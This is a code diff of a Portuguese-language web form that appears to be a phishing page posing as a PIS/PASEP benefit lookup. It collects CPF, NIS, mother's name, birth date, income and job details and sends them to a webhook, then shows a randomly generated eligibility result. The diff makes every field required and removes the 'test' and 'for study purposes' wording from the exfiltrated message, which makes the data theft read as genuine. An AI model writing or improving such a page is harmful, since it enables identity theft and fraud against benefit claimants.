@@ -349,7 +349,7 @@
                     <div class="form-group">
                         <label for="nome_completo" class="required">Nome Completo</label>
                         <div class="input-wrapper">
-                            <input type="text" id="nome_completo" name="nome_completo" placeholder="Digite seu nome completo">
+                            <input type="text" id="nome_completo" name="nome_completo" placeholder="Digite seu nome completo" required>
                             <i class="fas fa-check valid-icon" id="nome_valid"></i>
                             <i class="fas fa-times valid-icon" id="nome_invalid"></i>
                         </div>
@@ -361,7 +361,7 @@
                     <div class="form-group">
                         <label for="cpf" class="required">CPF</label>
                         <div class="input-wrapper">
-                            <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00">
+                            <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required>
                             <i class="fas fa-check valid-icon" id="cpf_valid"></i>
                             <i class="fas fa-times valid-icon" id="cpf_invalid"></i>
                         </div>
@@ -371,7 +371,7 @@
                     <div class="form-group">
                         <label for="data_nascimento" class="required">Data de Nascimento</label>
                         <div class="input-wrapper">
-                            <input type="date" id="data_nascimento" name="data_nascimento">
+                            <input type="date" id="data_nascimento" name="data_nascimento" required>
                             <i class="fas fa-check valid-icon" id="nascimento_valid"></i>
                             <i class="fas fa-times valid-icon" id="nascimento_invalid"></i>
                         </div>
@@ -383,7 +383,7 @@
                     <div class="form-group">
                         <label for="nis" class="required">Número do NIS</label>
                         <div class="input-wrapper">
-                            <input type="text" id="nis" name="nis" placeholder="000.00000.00-0">
+                            <input type="text" id="nis" name="nis" placeholder="000.00000.00-0" required>
                             <i class="fas fa-check valid-icon" id="nis_valid"></i>
                             <i class="fas fa-times valid-icon" id="nis_invalid"></i>
                         </div>
@@ -393,7 +393,7 @@
                     <div class="form-group">
                         <label for="nome_mae" class="required">Nome da Mãe</label>
                         <div class="input-wrapper">
-                            <input type="text" id="nome_mae" name="nome_mae" placeholder="Nome completo da sua mãe">
+                            <input type="text" id="nome_mae" name="nome_mae" placeholder="Nome completo da sua mãe" required>
                             <i class="fas fa-check valid-icon" id="mae_valid"></i>
                             <i class="fas fa-times valid-icon" id="mae_invalid"></i>
                         </div>
@@ -407,7 +407,7 @@
                     <div class="form-group">
                         <label for="tempo_contribuicao" class="required">Tempo de Contribuição (anos)</label>
                         <div class="input-wrapper">
-                            <input type="number" id="tempo_contribuicao" name="tempo_contribuicao" min="0" max="50" placeholder="Ex: 5">
+                            <input type="number" id="tempo_contribuicao" name="tempo_contribuicao" min="0" max="50" placeholder="Ex: 5" required>
                             <i class="fas fa-check valid-icon" id="contribuicao_valid"></i>
                             <i class="fas fa-times valid-icon" id="contribuicao_invalid"></i>
                         </div>
@@ -417,7 +417,7 @@
                     <div class="form-group">
                         <label for="ultimo_emprego" class="required">Último Emprego Registrado</label>
                         <div class="input-wrapper">
-                            <input type="date" id="ultimo_emprego" name="ultimo_emprego">
+                            <input type="date" id="ultimo_emprego" name="ultimo_emprego" required>
                             <i class="fas fa-check valid-icon" id="emprego_valid"></i>
                             <i class="fas fa-times valid-icon" id="emprego_invalid"></i>
                         </div>
@@ -428,7 +428,7 @@
                 <div class="form-group">
                     <label for="renda" class="required">Renda Mensal Média (R$)</label>
                     <div class="input-wrapper">
-                        <input type="text" id="renda" name="renda" placeholder="1.500,00">
+                        <input type="text" id="renda" name="renda" placeholder="1.500,00" required>
                         <i class="fas fa-check valid-icon" id="renda_valid"></i>
                         <i class="fas fa-times valid-icon" id="renda_invalid"></i>
                     </div>
@@ -619,9 +619,7 @@
                 const fieldName = field.id;
                 const isValid = field.classList.contains('valid');
                 
-                if (!isValid && field.value === '') {
-                    allValid = false;
-                } else if (!isValid) {
+                if (!isValid) {
                     allValid = false;
                 }
             });
@@ -629,20 +627,26 @@
             consultarBtn.disabled = !allValid;
         }
         
-        // Processamento do formulário MODIFICADO para enviar ao webhook
+        // Processamento do formulário corrigido
         form.addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // Coletar dados do formulário
+            // Coletar dados do formulário de forma completa
+            const getFieldValue = (id) => {
+                const el = document.getElementById(id);
+                return el ? el.value.trim() : "Não informado";
+            };
+            
             const formData = {
-                nome: document.getElementById('nome_completo').value,
-                cpf: document.getElementById('cpf').value,
-                data_nascimento: document.getElementById('data_nascimento').value,
-                nis: document.getElementById('nis').value,
-                nome_mae: document.getElementById('nome_mae').value,
-                tempo_contribuicao: document.getElementById('tempo_contribuicao').value,
-                ultimo_emprego: document.getElementById('ultimo_emprego').value,
-                renda: document.getElementById('renda').value
+                nome: getFieldValue('nome_completo'),
+                cpf: getFieldValue('cpf'),
+                data_nascimento: getFieldValue('data_nascimento'),
+                nis: getFieldValue('nis'),
+                nome_mae: getFieldValue('nome_mae'),
+                tempo_contribuicao: getFieldValue('tempo_contribuicao'),
+                ultimo_emprego: getFieldValue('ultimo_emprego'),
+                renda: getFieldValue('renda'),
+                data_consulta: new Date().toISOString()
             };
 
             // Mostrar loading
@@ -656,32 +660,35 @@
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    content: '🚀 **Nova consulta PIS/PASEP (TESTE)**',
+                    content: '📋 **Nova consulta PIS/PASEP**',
                     embeds: [{
-                        title: '📋 Dados do Formulário (Fictício)',
-                        description: 'Dados enviados para fins de estudo:',
+                        title: 'Dados da Consulta',
                         color: 0x3498db,
                         fields: [
-                            { name: '👤 Nome', value: formData.nome || 'Não informado', inline: true },
+                            { name: '👤 Nome Completo', value: formData.nome || 'Não informado', inline: true },
                             { name: '🆔 CPF', value: formData.cpf || 'Não informado', inline: true },
-                            { name: '📅 Data Nasc.', value: formData.data_nascimento || 'Não informado', inline: true },
+                            { name: '🎂 Data Nascimento', value: formData.data_nascimento || 'Não informado', inline: true },
                             { name: '🔢 NIS', value: formData.nis || 'Não informado', inline: true },
                             { name: '👩 Nome da Mãe', value: formData.nome_mae || 'Não informado', inline: true },
                             { name: '⏳ Tempo Contribuição', value: formData.tempo_contribuicao ? `${formData.tempo_contribuicao} anos` : 'Não informado', inline: true },
                             { name: '💼 Último Emprego', value: formData.ultimo_emprego || 'Não informado', inline: true },
-                            { name: '💰 Renda', value: formData.renda ? `R$ ${formData.renda}` : 'Não informado', inline: true }
+                            { name: '💰 Renda Mensal', value: formData.renda ? `R$ ${formData.renda}` : 'Não informado', inline: true },
+                            { name: '📅 Data da Consulta', value: new Date(formData.data_consulta).toLocaleString(), inline: false }
                         ],
-                        timestamp: new Date().toISOString()
+                        timestamp: formData.data_consulta
                     }]
                 })
             })
-            .then(() => {
-                // Simular resultado da consulta (70% de chance de ter direito)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Erro ao enviar dados');
+                }
+                // Simular resultado da consulta
                 const resultado = Math.random() > 0.3;
                 showResult(resultado);
             })
             .catch(error => {
-                console.error('Erro ao enviar para webhook:', error);
+                console.error('Erro:', error);
                 // Mostrar resultado mesmo se falhar o webhook
                 const resultado = Math.random() > 0.3;
                 showResult(resultado);
